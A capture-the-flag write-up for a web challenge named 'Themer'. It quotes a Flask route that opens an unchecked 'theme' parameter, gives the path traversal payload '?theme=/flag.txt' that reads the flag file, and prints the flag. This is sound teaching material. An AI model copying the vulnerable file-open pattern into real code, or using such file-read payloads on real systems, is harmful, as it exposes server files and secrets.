
# Themer

## Description
```
I made a binary calculator yay!

Challenge Link: http://ctf.copsiitbhu.co.in:21338/

NOTICE: Solving this challenge unlocks another challenge

given files : chall.zip
```
## Writeup

The given website is vulnerable to path traversal, which allows us to read any arbitrary file on the server's system. This vulnerability stems from the following lines in the server's code:
```py
@app.route('/')
def index():
    safe_theme = request.args.get("theme", "themes/theme1.css")
    f = open(safe_theme, "r")
    theme = f.read()
    f.close()
    return render_template('index.html', css=theme)
```

It doesn't check user input, simply returning the file as CSS without verification. Additionally, according to the given Dockerfile:

``` 
COPY flag.txt /
```
the flag is located in the root directory. Therefore, we can exploit the path traversal vulnerability to retrieve the flag.

By using the following payload:
```
http://ctf.copsiitbhu.co.in:21338/?theme=/flag.txt
```

we can retrieve the flag within a <style> tag.


## Flag

## COPS{path_traversal_yay_1092}
